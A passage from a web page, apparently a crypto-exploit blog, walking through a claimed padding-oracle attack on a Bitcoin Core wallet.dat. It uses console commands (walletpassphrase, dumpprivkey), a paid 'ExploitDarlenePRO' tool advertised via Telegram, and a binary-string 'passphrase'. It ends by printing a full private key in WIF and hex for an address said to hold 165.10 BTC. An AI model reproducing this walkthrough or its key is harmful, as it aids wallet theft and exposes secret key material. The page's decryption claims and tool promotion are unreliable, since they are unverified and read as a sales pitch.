<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Let’s run the command to check the private key:</p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-39f801194894bafde5a968537a8c7a57" style="color:#4092c2"><code><strong>dumpprivkey 1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-22-1024x675.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5066"></figure></div>


<p>We see a warning:&nbsp;<strong><a href="https://keyhunters.ru/understanding-and-resolving-the-error-please-enter-the-wallet-passphrase-with-walletpassphrase-first-code-13-in-bitcoin-core/" target="_blank" rel="noreferrer noopener">Error: Please enter the wallet passphrase with walletpassphrase first. (code -13)</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h1 class="wp-block-heading has-text-align-center"><a href="https://exploitdarlenepro.com/1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS" target="_blank" rel="noreferrer noopener">Padding Oracle Attack</a></h1>


<div class="wp-block-image">
<figure class="aligncenter is-resized"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-28.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5793" style="width:840px;height:auto"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter is-resized"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-29.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5795" style="width:840px;height:auto"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://exploitdarlenepro.com/1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the Padding Oracle Attack</strong></a>&nbsp;method on Wallet.dat&nbsp;and decrypt the password for access into a binary password format.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full is-resized"><a href="https://www.youtube.com/watch?v=gDBDP9bseE0"><img loading="lazy" decoding="async" width="746" height="429" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-8.png" alt="Discrete Logarithms" class="wp-image-3147" style="width:838px;height:auto" srcset="https://cryptodeeptech.ru/wp-content/uploads/2025/01/image-8.png 746w, https://cryptodeeptech.ru/wp-content/uploads/2025/01/image-8-300x173.png 300w" sizes="auto, (max-width: 746px) 100vw, 746px"></a></figure></div>






<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-23-1024x460.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5067"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-24-1024x455.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5068"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-25-1024x452.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5069"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading"><strong>First we get access to the&nbsp;<a href="https://github.com/smartibase/Biggest-Lost-Bitcoin-Wallets-List/raw/main/165.10%20BTC/wallet.dat" target="_blank" rel="noreferrer noopener">wallet.dat</a>&nbsp;file for the amount:&nbsp;</strong><strong><a href="https://github.com/smartibase/Biggest-Lost-Bitcoin-Wallets-List/tree/main/165.10%20BTC" target="_blank" rel="noreferrer noopener">165.10 BTC</a></strong><strong><a href="https://github.com/smartibase/Biggest-Lost-Bitcoin-Wallets-List/tree/main/165.10%20BTC" target="_blank" rel="noreferrer noopener"></a></strong></h2>



<h2 class="wp-block-heading"><strong>Clone Repository:&nbsp;<a href="https://github.com/smartibase/Biggest-Lost-Bitcoin-Wallets-List.git" target="_blank" rel="noreferrer noopener">Biggest Lost Bitcoin Wallets List</a></strong></h2>



<pre class="wp-block-code has-text-color has-link-color wp-elements-25f100f67d0aea637778e7f45a3ad0c0" style="color:#4092c2"><code><strong>git clone https://github.com/keyhunters/Biggest-Lost-Bitcoin-Wallets-List.git</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-26-1024x574.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5070"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center"><strong><a href="https://keyhunters.ru/total-commander/" target="_blank" rel="noreferrer noopener">Total Commander</a></strong></h2>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-1(2).png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-982"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-27.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5071"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-28(1).png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5072"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://github.com/keyhunters/Biggest-Lost-Bitcoin-Wallets-List/tree/main/165.10%20BTC">https://github.com/keyhunters/Biggest-Lost-Bitcoin-Wallets-List/tree/main/165.10%20BTC</a></p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-5-1536x674.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-left"><strong>Download and install&nbsp;&nbsp;<a href="https://bitcoincore.org/bin/bitcoin-core-0.18.0" target="_blank" rel="noreferrer noopener">Bitcoin Core 0.18.0</a></strong></h2>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-7-1024x551.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-994"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter is-resized"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-9.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-997" style="width:839px;height:auto"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading"><strong>Откроем path:&nbsp;<a href="https://keyhunters.ru/bitcoin-core-wallet-dat/" target="_blank" rel="noreferrer noopener">c:\Users\User\AppData\Roaming\Bitcoin\</a></strong></h2>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-11.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-1003"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading"><strong>Let’s move the file:&nbsp;</strong><strong><a href="https://github.com/smartibase/Biggest-Lost-Bitcoin-Wallets-List/raw/main/165.10%20BTC/wallet.dat" target="_blank" rel="noreferrer noopener">wallet.dat</a></strong></h2>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-6-1536x584.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading"><a href="file:///C:/Users/User/AppData/Roaming/Bitcoin/wallet.dat"><strong>c:\Users\User\AppData\Roaming\Bitcoin\wallet.d</strong></a><a href="https://keyhunters.ru/bitcoin-core-wallet-dat/" target="_blank" rel="noreferrer noopener"><strong>at</strong></a></h2>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-4(1).png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-1090"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading"><strong><a href="https://keyhunters.ru/bitcoin-core-wallet/" target="_blank" rel="noreferrer noopener">Let’s launch the Bitcoin Core</a>&nbsp;wallet<a href="https://keyhunters.ru/bitcoin-core-wallet/" target="_blank" rel="noreferrer noopener"></a></strong></h2>


<div class="wp-block-image">
<figure class="aligncenter is-resized"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-13.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-1008" style="width:840px;height:auto"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h1 class="wp-block-heading has-text-align-left"><a href="https://exploitdarlenepro.com/" target="_blank" rel="noreferrer noopener"><strong>Encryt Wallet…</strong></a></h1>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter is-resized"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-14.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-1010" style="width:837px;height:auto"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h1 class="wp-block-heading"><strong>Let’s open the console</strong></h1>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code><strong>getaddressinfo 1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-8-1536x1011.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading"><strong><a href="https://dockeyhunt.com/Cryptocurrency-Prices" target="_blank" rel="noreferrer noopener">Bitcoin Address Information:</a></strong></h2>



<h2 class="wp-block-heading"><strong>Balance: 165.10252195 BTC</strong></h2>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-22-1024x550.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center"><strong><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noreferrer noopener">Metasploit Framework and use MSFVenom</a></strong></h2>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-17.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-1021"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading"><strong><a href="https://keyhunters.ru/metasploit-framework-msfvenom/" target="_blank" rel="noreferrer noopener">The Role of Metasploit Framework in the Development of msfvenom</a></strong></h2>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><a href="https://keyhunters.ru/metasploit-framework-msfvenom/" target="_blank" rel="noreferrer noopener">msfvenom</a>&nbsp;is a tool created by combining the two previous tools:&nbsp;&nbsp;<br><code>msfpayload</code>and&nbsp;&nbsp;&nbsp;<code>msfencode</code>. It allows users to create payloads for different platforms and encoders, and provides the ability to customize the payload parameters. msfvenom supports various output formats, including executables, scripts, and even code for web applications.</p>



<p><a href="https://keyhunters.ru/metasploit-framework-msfvenom/" target="_blank" rel="noreferrer noopener">The Metasploit Framework</a>&nbsp;&nbsp;plays a key role in the development of msfvenom for several reasons:</p>



<p>1. Exploit Integration: msfvenom allows users to create payloads that can be used with exploits from Metasploit. This simplifies the penetration testing process as users can quickly generate payloads that match specific vulnerabilities.</p>



<p>2. Versatility: With support for multiple formats and platforms, msfvenom has become a versatile payload creation tool. This allows security professionals to tailor their attacks to different systems and environments.</p>



<p>3. Updates and Support: The Metasploit Framework is constantly updated to keep msfvenom up to date and effective. New features and improvements in Metasploit directly impact msfvenom’s capabilities, making it more powerful and flexible.</p>



<p>4. Education and Research: Metasploit and msfvenom are important tools for cybersecurity education and research. They allow students and security professionals to study vulnerabilities and exploitation techniques in a secure environment.</p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-18-1024x908.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-1022"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p></p>



<h2 class="wp-block-heading has-text-align-center"><strong><a href="https://t.me/exploitdarlenepro" target="_blank" rel="noreferrer noopener">Run ExploitDalenePRO.exe</a></strong></h2>



<p></p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-19.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-1025"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-20-1024x699.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-1028"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code has-text-color has-link-color wp-elements-4f6e6d7ec599a4ab5fc655aa081838bf" style="color:#4092c2"><code><strong>1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-10.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code has-text-color has-link-color wp-elements-639af7c85b80e040598106a689591570" style="color:#4092c2"><code><strong>c:\BitcoinTools\ExploitDalenePRO\modules\</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-28(2).png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-1040"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code has-text-color has-link-color wp-elements-4554f2d477fc2a29c8e7da1425fe5021" style="color:#4092c2"><code><strong>c:\BitcoinTools\ExploitDalenePRO\modules\exploits\</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-29(1).png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-1041"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code has-text-color has-link-color wp-elements-48553e5b26ad87491e9fc488cd080a99" style="color:#4092c2"><code><strong>c:\BitcoinTools\ExploitDalenePRO\modules\exploits\ExploitDarlenePRO\</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-30.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-1042"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code has-text-color has-link-color wp-elements-67521ba430d0c5137ea7c2552e879ae9" style="color:#4092c2"><code><strong>c:\BitcoinTools\ExploitDalenePRO\modules\exploits\ExploitDarlenePRO\decode_core.rb</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-31.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-1043"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading"><strong><a href="https://t.me/exploitdarlenepro" target="_blank" rel="noreferrer noopener">decode_core.rb</a></strong></h2>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-13(1).png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-14(1).png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code has-text-color has-link-color wp-elements-bed44c1f9f610b2e8c69e258fdc4b2b1" style="color:#4092c2"><code><strong>c:\BitcoinTools\ExploitDalenePRO\bitcoin\</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-24(1).png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-1034"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading"><strong><a href="https://github.com/bitcoin/bitcoin" target="_blank" rel="noreferrer noopener">https://github.com/bitcoin/bitcoin</a></strong></h2>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-26-1024x471.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-1037"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading"><strong><a href="https://github.com/bitcoin/bitcoin/blob/master/src/crypto/aes.h" target="_blank" rel="noreferrer noopener">https://github.com/bitcoin/bitcoin/blob/master/src/crypto/aes.h</a></strong></h2>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-27(1).png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-1038"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code><strong>c:\BitcoinTools\ExploitDalenePRO\bitcoin\src\</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-23.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-1032"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code has-text-color has-link-color wp-elements-d23feeedf412a61510ef40143d773991" style="color:#4092c2"><code><strong>c:\BitcoinTools\ExploitDalenePRO\bitcoin\src\crypto\aes.cpp</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-22.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-1030"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code has-text-color has-link-color wp-elements-d23feeedf412a61510ef40143d773991" style="color:#4092c2"><code><strong>c:\BitcoinTools\ExploitDalenePRO\bitcoin\src\crypto\aes.cpp</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-16.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code has-text-color has-link-color wp-elements-bf271f467b93ca96913ee2b488c3446b" style="color:#4092c2"><code><strong>c:\Users\User\AppData\Roaming\Bitcoin\</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-4(1).png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-1090"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center"><strong><a href="https://github.com/smartibase/Biggest-Lost-Bitcoin-Wallets-List/raw/main/165.10%20BTC/wallet.dat" target="_blank" rel="noreferrer noopener">Upload Wallet.dat</a></strong></h2>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-18.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/msfvenom_006.gif" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading"><strong><a href="https://github.com/smartibase/Biggest-Lost-Bitcoin-Wallets-List/blob/main/165.10%20BTC/result.json">result.json</a></strong></h2>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-19-1536x163.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin"></figure></div>


<pre class="wp-block-code has-text-color has-link-color wp-elements-1e32b02bba1e534e8f2871556249c62b" style="color:#4092c2"><code><strong>walletpassphrase 1111111101110111010010110110010101100010110010001011111011000111101010010010000110101110100110000001100011001101000100001110101110100101101111000010100000000110100010110011000111111001111000110110001011000010000011001001000100101011001000101100110001101000 60</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading"><strong>Run the command and get&nbsp;<a href="https://keyhunters.ru/bitcoin-core-dumpprivkey/" target="_blank" rel="noreferrer noopener">Private Key</a></strong></h2>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>The dumpprivkey command in Bitcoin Core</p>



<p>The&nbsp;<code><strong>dumpprivkey</strong></code>&nbsp;command is a command used in the Bitcoin Core wallet command line interface (CLI) to export the private key associated with a specific Bitcoin address. The syntax for the command is as follows:</p>



<p>“<code>&nbsp;<strong>dumpprivkey “address”</strong>&nbsp;“</code></p>



<p>Where “address” is the Bitcoin address for which you want to receive the&nbsp;<a href="https://keyhunters.ru/bitcoin-core-dumpprivkey/" target="_blank" rel="noreferrer noopener">private key</a>.</p>



<p>How dumpprivkey command works</p>



<p>When you type the&nbsp;<code><strong>dumpprivkey</strong></code>&nbsp;command, Bitcoin Core looks for the specified address in its wallet and, if found, returns the corresponding&nbsp;<a href="https://keyhunters.ru/bitcoin-core-dumpprivkey/" target="_blank" rel="noreferrer noopener">private key</a>&nbsp;in WIF format. This allows the user to store the private key in a safe place or import it into another wallet.</p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code has-text-color has-link-color wp-elements-39f801194894bafde5a968537a8c7a57" style="color:#4092c2"><code><strong>dumpprivkey 1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-20.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading"><strong><a href="https://dockeyhunt.com/Bitcoin-Address" target="_blank" rel="noreferrer noopener">Private Key Information:</a></strong></h2>



<pre class="wp-block-code has-text-color has-link-color wp-elements-d54d94916fc72e22809c03b8c8a1518b" style="color:#4092c2"><code><strong>5JdUtcYt3ZBQN8aPZWNffXzNCTPds7aQtJk7zc9iQShNQ9yWe7x</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-21-1536x823.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading"><strong><a href="https://dockeyhunt.com/Cryptocurrency-Prices" target="_blank" rel="noreferrer noopener">Bitcoin Address Information:</a></strong></h2>



<h2 class="wp-block-heading has-text-color has-link-color wp-elements-f267b2e604240017d98ca74e3bde8ca0" style="color:#4092c2"><strong>Balance: 165.10252195 BTC</strong></h2>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-22-1536x824.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading"><strong><a href="https://www.coinbase.com/converter/btc/usd" target="_blank" rel="noreferrer noopener">https://www.coinbase.com/converter/btc/usd</a></strong></h2>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin"><figcaption class="wp-element-caption"><strong>165.10252195 &gt; 15802506,39 USD</strong></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><em><a href="https://keyhunters.ru/exploring-bitcoin-tools-in-python-a-comprehensive-guide-to-the-bitcoin-package-on-pypi/" target="_blank" rel="noreferrer noopener"></a></em><a href="https://keyhunters.ru/exploring-bitcoin-tools-in-python-a-comprehensive-guide-to-the-bitcoin-package-on-pypi/"><strong>Let’s install the Bitcoin&nbsp;</strong></a><a href="https://keyhunters.ru/exploring-bitcoin-tools-in-python-a-comprehensive-guide-to-the-bitcoin-package-on-pypi/" target="_blank" rel="noreferrer noopener"><strong>library</strong></a><a href="https://keyhunters.ru/exploring-bitcoin-tools-in-python-a-comprehensive-guide-to-the-bitcoin-package-on-pypi/"></a></p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-9a0f1a67ae8617004ae12ce64ce4a4b7" style="color:#4092c2"><code><strong>!pip3 install bitcoin</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-25-1024x271.png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5734"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Let’s run&nbsp;&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/37DiscreteLogarithm/priv_addr.py" target="_blank" rel="noreferrer noopener"><strong>the code</strong></a>&nbsp;&nbsp;to check the Bitcoin Address match:</p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Discrete Logarithms - «CRYPTO DEEP TECH»_files/image-30(1).png" alt="Discrete Logarithm mathematical methods and tools for recovering cryptocurrency wallets Bitcoin" class="wp-image-5078"></figure></div>


<pre class="wp-block-code has-text-color has-link-color wp-elements-a346db937579cfa0c287f6309f8b8a07" style="color:#4092c2"><code><strong>__________________________________________________

Private Key WIF: 5JdUtcYt3ZBQN8aPZWNffXzNCTPds7aQtJk7zc9iQShNQ9yWe7x
Bitcoin Address: 1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS
total_received 	= 165.10252195 Bitcoin
__________________________________________________</strong></code></pre>



<p><strong>That’s right! The private key corresponds to the Bitcoin Wallet.</strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Let’s open&nbsp;&nbsp;<strong><a href="https://cryptodeeptech.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress</a></strong>&nbsp;&nbsp;and check:</h2>



<pre class="wp-block-code has-text-color has-link-color wp-elements-1a5ad58687258b2668d429e375eadd82" style="color:#4092c2"><code><strong>ADDR: 1PYgfSouGGDkrMfLs6AYmwDqMLiVrCLfeS
WIF:  5JdUtcYt3ZBQN8aPZWNffXzNCTPds7aQtJk7zc9iQShNQ9yWe7x
HEX:  6b29781e725708ae4d94e13730a2718ee3383ea5d911e77d4c2a2fd0c99c1232</strong></code></pre>


<div class="wp-block-image">
